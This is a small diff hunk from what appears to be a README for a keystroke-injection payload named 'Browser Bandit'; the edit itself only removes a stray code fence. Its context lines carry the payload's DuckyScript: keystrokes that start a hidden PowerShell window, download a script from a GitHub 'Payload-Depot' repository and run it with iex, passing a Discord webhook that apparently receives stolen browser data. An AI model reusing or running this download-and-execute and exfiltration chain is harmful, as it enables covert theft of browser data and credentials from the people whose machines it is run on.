@@ -41,7 +41,7 @@ STRING $webhook = '<DISCORD WEBHOOK HERE>'
 ENTER
 SPACE
 STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$webhook='$webhook'; iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/BrowserBandit.txt').Content" -NoNewWindow
-ENTER```
+ENTER
 
 
 ## 3. Upload Your Payload to SignalStrike
